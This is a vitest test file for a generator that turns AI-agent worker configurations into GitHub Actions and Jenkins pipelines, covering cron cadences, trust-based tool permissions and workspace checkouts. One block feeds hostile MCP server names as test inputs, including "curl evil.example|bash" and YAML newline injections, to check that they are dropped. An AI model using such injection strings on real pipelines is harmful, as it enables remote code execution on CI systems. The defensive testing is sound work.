import { describe, expect, it } from 'vitest';

import type { Flow } from './schema';
import type { Worker } from './worker';
import { buildCiDeploy, ciPermissions, cronFromCadence } from './ciDeploy';

function flow(id: string, backend: Flow['participants'][number]['backend'] = 'claude'): Flow {
  return {
    id,
    name: `Flow ${id}`,
    input: 'user_prompt',
    participants: [{ id: 'primary', name: 'Sonnet', backend, model: 'claude-sonnet-4-6', kind: 'primary' }],
    steps: [
      // A real flow names its tools; the generator reads the allow-list off
      // this, so a fixture with an empty list would be testing the
      // "cannot narrow" path rather than the ordinary one.
      { id: 'step_1', participantId: 'primary', role: 'planner', inputs: ['user_prompt'], tools: ['Read'], output: 'plan.md' },
    ],
    source: 'user',
    filePath: `/tmp/${id}.yaml`,
  };
}

function worker(overrides: Partial<Worker> = {}): Worker {
  return {
    id: 'w1',
    name: 'Release Nanny',
    jobDescription: 'Watch the release branch every morning and report what is not green.',
    projectPath: '/repo',
    cadence: { kind: 'daily', time: '09:00' },
    trust: 'trusted',
    caps: { maxItemsPerShift: 3, runIn: 'worktree' },
    budgetUSDPerMonth: 12,
    heartbeatModel: 'claude-sonnet-4-6',
    flowIds: ['nightly-review'],
    enabled: true,
    createdAt: 1,
    ...overrides,
  };
}

describe('cronFromCadence', () => {
  it('renders a daily cadence', () => {
    expect(cronFromCadence({ kind: 'daily', time: '09:00', days: [1, 2, 3, 4, 5] })).toBe('0 9 * * 1,2,3,4,5');
  });

  it('renders a sub-hour interval', () => {
    expect(cronFromCadence({ kind: 'interval', everyMinutes: 30 })).toBe('*/30 * * * *');
  });

  it('renders an hours-or-more interval with a window', () => {
    expect(
      cronFromCadence({ kind: 'interval', everyMinutes: 120, window: { start: '08:00', end: '17:00' } }),
    ).toBe('0 8-17/2 * * *');
  });

  it('is null for on demand', () => {
    expect(cronFromCadence(null)).toBeNull();
  });

  it('splits a window that wraps midnight into two ranges', () => {
    expect(
      cronFromCadence({ kind: 'interval', everyMinutes: 15, window: { start: '22:00', end: '02:00' } }),
    ).toBe('*/15 22-23,0-2 * * *');
  });

  it('splits a wrapping window on the hours-or-more path too', () => {
    expect(
      cronFromCadence({ kind: 'interval', everyMinutes: 120, window: { start: '22:00', end: '02:00' } }),
    ).toBe('0 22-23,0-2/2 * * *');
  });
});

describe('ciPermissions', () => {
  it('denies everything for a probationary worker', () => {
    expect(ciPermissions(worker({ trust: 'probation' }))).toBe('deny');
  });

  it('allows the allow-list for an autonomous worker', () => {
    expect(
      ciPermissions(worker({ trust: 'autonomous', caps: { maxItemsPerShift: 3, runIn: 'cwd', allowExternalActions: true } })),
    ).toBe('allow-list');
  });
});

describe('buildCiDeploy', () => {
  it('produces the bundle and a GitHub Actions workflow', () => {
    const plan = buildCiDeploy({
      worker: worker({ cadence: { kind: 'daily', time: '09:00', days: [1, 2, 3, 4, 5] } }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'name: Release Nanny\n',
    });
    expect(plan.files.map((f) => f.path)).toEqual([
      '.overcli/workers/release-nanny.worker.yaml',
      '.github/workflows/overcli-release-nanny.yml',
    ]);
    const workflow = plan.files[1].contents;
    expect(workflow).toContain('workflow_dispatch:');
    expect(workflow).toContain('cron: "0 9 * * 1,2,3,4,5"');
  });

  it('produces a Jenkinsfile', () => {
    const plan = buildCiDeploy({
      worker: worker(),
      flows: [flow('nightly-review')],
      target: 'jenkins',
      workerYaml: 'name: Release Nanny\n',
    });
    const jenkinsfile = plan.files[1].contents;
    expect(jenkinsfile).toContain('disableConcurrentBuilds()');
    expect(jenkinsfile).toContain('archiveArtifacts');
  });

  it('installs from the alpha dist-tag, not latest', () => {
    for (const target of ['github', 'jenkins'] as const) {
      const plan = buildCiDeploy({
        worker: worker({ trust: 'trusted' }),
        flows: [flow('nightly-review')],
        target,
        workerYaml: 'x',
      });
      expect(plan.files[1].contents).toContain('@overcodelions/overcli@alpha');
      expect(plan.files[1].contents).not.toMatch(/npm i -g overcli\s/);
    }
  });

  it('names no action that does not exist', () => {
    // The GitHub path used to call overcodelions/setup-overcli@v1, which was
    // never published — the generated workflow referenced a step that could
    // not resolve. Both targets install the same way now.
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(plan.files[1].contents).not.toContain('setup-overcli');
    expect(plan.files[1].contents).toContain('actions/setup-node@v4');
  });

  it('installs the backend CLI package in the Jenkins Setup stage', () => {
    const plan = buildCiDeploy({
      worker: worker(),
      flows: [flow('nightly-review', 'claude')],
      target: 'jenkins',
      workerYaml: 'name: Release Nanny\n',
    });
    const jenkinsfile = plan.files[1].contents;
    expect(jenkinsfile).toContain('@anthropic-ai/claude-code');
  });

  it('falls back to installing claude when every backend is Ollama', () => {
    const plan = buildCiDeploy({
      worker: worker({ heartbeatBackend: 'ollama' }),
      flows: [flow('nightly-review', 'ollama')],
      target: 'github',
      workerYaml: 'name: Release Nanny\n',
    });
    // Every backend is Ollama, which stock runners do not have, so the
    // install list would otherwise be empty and the job would have no agent
    // CLI at all.
    expect(plan.files[1].contents).toContain('@anthropic-ai/claude-code');
  });

  it('never emits auto-approve, and a probationary worker gets deny', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'probation' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'name: Release Nanny\n',
    });
    const workflow = plan.files[1].contents;
    expect(workflow).toContain('--permissions deny');
    expect(workflow).not.toContain('auto-approve');
  });

  it('warns when a flow runs on Ollama', () => {
    const plan = buildCiDeploy({
      worker: worker(),
      flows: [flow('nightly-review', 'ollama')],
      target: 'github',
      workerYaml: 'name: Release Nanny\n',
    });
    expect(plan.warnings.some((w) => w.includes('Ollama'))).toBe(true);
  });
});

describe('trust and the allow-list', () => {
  it('carries the worker’s trust into the job, since the bundle cannot', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'autonomous' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(plan.files[1].contents).toContain('--trust autonomous');
  });

  it('warns that a probationary worker will do nothing in CI', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'probation' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(plan.warnings.some((w) => w.includes('probation'))).toBe(true);
  });

  it('allows exactly what the worker\u2019s flows declare, not an invented default', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [flow('nightly-review')],
      target: 'jenkins',
      workerYaml: 'x',
    });
    // The flow factory declares Read on its one step. Nothing else should
    // appear — a default the flow never asked for is a permission nobody
    // granted.
    expect(plan.files[1].contents).toContain('--allow-tool Read');
    expect(plan.files[1].contents).not.toContain('Glob');
    expect(plan.notes.some((c) => c.includes('exactly what'))).toBe(true);
  });

  it('cannot narrow a step that declares no tools, and says which', () => {
    const bare = flow('nightly-review');
    bare.steps[0].tools = [];
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [bare],
      target: 'github',
      workerYaml: 'x',
    });
    expect(plan.warnings.some((w) => w.includes('declare no tools'))).toBe(true);
    expect(plan.warnings.some((w) => w.includes('nightly-review/step_1'))).toBe(true);
  });

  it('omits the allow-list entirely under deny, where it would mean nothing', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'probation' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(plan.files[1].contents).not.toContain('--allow-tool');
  });

  it('installs from the alpha dist-tag, not latest', () => {
    for (const target of ['github', 'jenkins'] as const) {
      const plan = buildCiDeploy({
        worker: worker({ trust: 'trusted' }),
        flows: [flow('nightly-review')],
        target,
        workerYaml: 'x',
      });
      expect(plan.files[1].contents).toContain('@overcodelions/overcli@alpha');
      expect(plan.files[1].contents).not.toMatch(/npm i -g overcli\s/);
    }
  });

  it('names no action that does not exist', () => {
    // The GitHub path used to call overcodelions/setup-overcli@v1, which was
    // never published — the generated workflow referenced a step that could
    // not resolve. Both targets install the same way now.
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(plan.files[1].contents).not.toContain('setup-overcli');
    expect(plan.files[1].contents).toContain('actions/setup-node@v4');
  });

  it('installs the backend CLI package in the Jenkins Setup stage', () => {
    const plan = buildCiDeploy({
      worker: worker(),
      flows: [flow('nightly-review', 'gemini')],
      target: 'jenkins',
      workerYaml: 'x',
    });
    expect(plan.files[1].contents).toContain('@anthropic-ai/claude-code');
    expect(plan.files[1].contents).toContain('@google/gemini-cli');
  });
});

describe('MCP names are attacker-controlled text, not shell', () => {
  const evil = (name: string) =>
    buildCiDeploy({
      worker: worker({ trust: 'trusted', mcpServers: [name] }),
      flows: [flow('nightly-review')],
      target: 'jenkins',
      workerYaml: 'x',
    });

  it('drops a name that would close the Groovy string and run a command', () => {
    const plan = evil("jira'; sh 'curl evil.example|bash");
    expect(plan.files[1].contents).not.toContain('curl evil.example');
    expect(plan.warnings.some((w) => w.includes('Dropped'))).toBe(true);
  });

  it('drops a name carrying a shell separator', () => {
    expect(evil('jira; curl evil.example | bash').files[1].contents).not.toContain('curl');
  });

  it('drops a name with a newline, which would inject YAML keys', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted', mcpServers: ['jira\n      - run: whoami'] }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(plan.files[1].contents).not.toContain('whoami');
  });

  it('keeps ordinary names, so the guard costs nothing legitimate', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted', mcpServers: ['github', 'atlassian-rovo', 'my.server_1'] }),
      flows: [flow('nightly-review')],
      target: 'jenkins',
      workerYaml: 'x',
    });
    expect(plan.files[1].contents).toContain('--mcp github atlassian-rovo my.server_1');
    expect(plan.warnings.some((w) => w.includes('Dropped'))).toBe(false);
  });

  it('names the dropped entries rather than silently swallowing them', () => {
    expect(evil("a'; bash").warnings.join(' ')).toContain('a\'; bash');
  });
});

describe('worker instructions are target-aware', () => {
  it('does not tell a Jenkins user to create a repository secret', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted', mcpServers: ['github'] }),
      flows: [flow('nightly-review')],
      target: 'jenkins',
      workerYaml: 'x',
    });
    expect(plan.steps.join(' ')).not.toContain('repository secret');
    expect(plan.steps.join(' ')).toContain('Manage Jenkins');
  });

  it('does not tell a GitHub user about the agent timezone', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    // The timezone is a note, not a step — there is nothing to perform.
    expect(plan.notes.join(' ')).toContain('UTC');
    expect(plan.notes.join(' ')).not.toContain('agent');
  });

  it('keeps the standing "not published" notice out of the warnings', () => {
    // It is true of every plan and never changes. Stacked with warnings about
    // the flow in front of you, the constant one trains you to skim past both.
    for (const target of ['github', 'jenkins'] as const) {
      const plan = buildCiDeploy({
        worker: worker({ trust: 'trusted' }),
        flows: [flow('nightly-review')],
        target,
        workerYaml: 'x',
      });
      expect(plan.toolNotice).toContain('Publish the CLI first');
      expect(plan.warnings.some((w) => w.includes('Publish the CLI first'))).toBe(false);
    }
  });
});

describe('a cadence chained off another flow', () => {
  const chained = { kind: 'onFlowComplete' as const, watchFlowId: 'scrape', onOutcome: 'success' as const };

  it('has no cron, because it has no clock', () => {
    expect(cronFromCadence(chained)).toBeNull();
  });

  it('says how to chain the jobs instead of silently dropping the trigger', () => {
    const gh = buildCiDeploy({
      worker: worker({ trust: 'trusted', cadence: chained }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(gh.warnings.some((w) => w.includes('workflow_run'))).toBe(true);

    const jenkins = buildCiDeploy({
      worker: worker({ trust: 'trusted', cadence: chained }),
      flows: [flow('nightly-review')],
      target: 'jenkins',
      workerYaml: 'x',
    });
    expect(jenkins.warnings.some((w) => w.includes('downstream build'))).toBe(true);
  });

  it('does not also claim the worker is on demand', () => {
    const plan = buildCiDeploy({
      worker: worker({ trust: 'trusted', cadence: chained }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(plan.warnings.some((w) => w.includes('on demand'))).toBe(false);
  });
});

describe('steps are things to do; notes are things to know', () => {
  const plan = () =>
    buildCiDeploy({
      worker: worker({ trust: 'trusted', mcpServers: ['github'] }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });

  it('every step is an instruction, in the order to perform it', () => {
    const steps = plan().steps;
    // Create the secrets, commit, verify, then stop the local copy. Pausing
    // before it is proven to work in CI would leave the worker doing nothing
    // anywhere.
    expect(steps[0]).toMatch(/^Create /);
    expect(steps.some((s) => s.startsWith('Commit and push'))).toBe(true);
    expect(steps[steps.length - 1]).toMatch(/^Pause /);
  });

  it('keeps the facts out of the numbered list', () => {
    const steps = plan().steps.join(' ');
    expect(steps).not.toContain('UTC');
    expect(steps).not.toContain('budget');
    expect(steps).not.toContain('denied');
  });

  it('names the actual files to commit rather than saying "these files"', () => {
    expect(plan().steps.some((s) => s.includes('.overcli/workers/release-nanny.worker.yaml'))).toBe(true);
  });

  it('tells you to prove it works before you switch the local worker off', () => {
    const steps = plan().steps;
    const verify = steps.findIndex((s) => s.includes('Run it once'));
    const pause = steps.findIndex((s) => s.startsWith('Pause'));
    expect(verify).toBeGreaterThanOrEqual(0);
    expect(verify).toBeLessThan(pause);
  });
});

describe('installing a private CLI', () => {
  const plan = (target: 'github' | 'jenkins') =>
    buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [flow('nightly-review')],
      target,
      workerYaml: 'x',
    });

  it('points npm at GitHub Packages for the scope, on both targets', () => {
    for (const t of ['github', 'jenkins'] as const) {
      expect(plan(t).files[1].contents).toContain('npm.pkg.github.com');
      expect(plan(t).files[1].contents).toContain('@overcodelions/overcli@alpha');
    }
  });

  it('uses the token Actions already has, so no new secret is needed there', () => {
    const gh = plan('github');
    expect(gh.files[1].contents).toContain('NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}');
    // …and therefore says nothing about a registry credential.
    expect(gh.steps.some((s) => s.includes('GITHUB_PACKAGES_TOKEN'))).toBe(false);
  });

  it('tells a Jenkins user about the extra credential, because the agent has none', () => {
    const j = plan('jenkins');
    expect(j.files[1].contents).toContain("credentialsId: 'GITHUB_PACKAGES_TOKEN'");
    expect(j.files[1].contents).toContain('.npmrc');
    expect(j.steps.some((s) => s.includes('GITHUB_PACKAGES_TOKEN') && s.includes('read:packages'))).toBe(
      true,
    );
  });
});

describe('a worker scoped to a workspace', () => {
  const plan = (workspace?: import('./ciDeploy').CiWorkspace) =>
    buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
      workspace,
    });

  it('refuses the project write, because there is no project', () => {
    // A workspace root is the symlink farm under Overcli's data directory, not
    // a checkout. Writing a pipeline file there puts it somewhere that is
    // never committed and is rebuilt on the next launch.
    const p = plan({ name: 'unifyr', members: [{ name: 'api', dir: 'api', remote: 'https://github.com/o/api.git' }, { name: 'web', dir: 'web', remote: 'https://github.com/o/web.git' }], unreachable: [] });
    expect(p.block).toBeDefined();
    expect(p.block?.reason).toContain('unifyr');
    expect(p.block?.reason).toContain('symlink farm');
  });

  it('says what to do instead rather than just refusing', () => {
    const p = plan({ name: 'unifyr', members: [{ name: 'api', dir: 'api', remote: 'https://github.com/o/api.git' }, { name: 'web', dir: 'web', remote: 'https://github.com/o/web.git' }], unreachable: [] });
    expect(p.block?.remedy).toContain('Copy or save');
    // And is honest that the multi-repo half is not built.
    expect(p.block?.remedy).toContain('2 member repositories side by side');
  });

  it('leads with the block, so it is read before the pipeline is', () => {
    const p = plan({ name: 'unifyr', members: [{ name: 'api', dir: 'api', remote: 'https://github.com/o/api.git' }, { name: 'web', dir: 'web', remote: 'https://github.com/o/web.git' }], unreachable: [] });
    expect(p.warnings).toContain(p.block!.reason);
    expect(p.warnings).toContain(p.block!.remedy);
  });

  it('leaves an ordinary project worker alone', () => {
    expect(plan().block).toBeUndefined();
  });

  it('still generates the files — they are the thing you copy out', () => {
    expect(plan({ name: 'unifyr', members: [{ name: 'api', dir: 'api', remote: 'https://github.com/o/api.git' }, { name: 'web', dir: 'web', remote: 'https://github.com/o/web.git' }], unreachable: [] }).files).toHaveLength(2);
  });
});

describe('a workspace becomes checkout steps', () => {
  const ws = {
    name: 'unifyr',
    members: [
      { name: 'api', dir: 'api', remote: 'https://github.com/unifyr/api.git' },
      { name: 'web', dir: 'web', remote: 'git@github.com:unifyr/web.git' },
    ],
    unreachable: [] as string[],
  };
  const plan = (target: 'github' | 'jenkins') =>
    buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [flow('nightly-review')],
      target,
      workerYaml: 'x',
      workspace: ws,
    });

  it('checks out every member side by side and runs in that directory', () => {
    const gh = plan('github').files[1].contents;
    expect(gh).toContain('path: workspace/api');
    expect(gh).toContain('path: workspace/web');
    expect(gh).toContain('--cwd workspace');
  });

  it('converts a remote URL to the owner/repo actions/checkout wants', () => {
    const gh = plan('github').files[1].contents;
    expect(gh).toContain('repository: unifyr/api');
    // ssh remotes too — the same repo reached a different way
    expect(gh).toContain('repository: unifyr/web');
    expect(gh).not.toContain('git@github.com');
  });

  it('clones each member on Jenkins, which has no checkout action', () => {
    const j = plan('jenkins').files[1].contents;
    expect(j).toContain("stage('Assemble workspace')");
    expect(j).toContain('git clone --depth 1 https://github.com/unifyr/api.git workspace/api');
    expect(j).toContain('--cwd workspace');
  });

  it('leaves a single-project job running where it always did', () => {
    const p = buildCiDeploy({
      worker: worker({ trust: 'trusted' }),
      flows: [flow('nightly-review')],
      target: 'github',
      workerYaml: 'x',
    });
    expect(p.files[1].contents).toContain('--cwd .');
    expect(p.files[1].contents).not.toContain('workspace/');
  });
});

describe('the state cache', () => {
  const plan = buildCiDeploy({
    worker: worker({ trust: 'trusted' }),
    flows: [flow('nightly-review')],
    target: 'github',
    workerYaml: 'x',
  });

  it('rolls the cache key, or the journal freezes at shift 1', () => {
    // actions/cache only SAVES when the key missed. A fixed key means run 2
    // restores run 1's state and skips the save, so every night after the
    // first re-proposes the same work with no way to tell.
    const c = plan.files[1].contents;
    expect(c).toContain('key: overcli-worker-release-nanny-${{ github.run_id }}');
    expect(c).toContain('restore-keys: |');
    expect(c).toContain('overcli-worker-release-nanny-');
  });
});
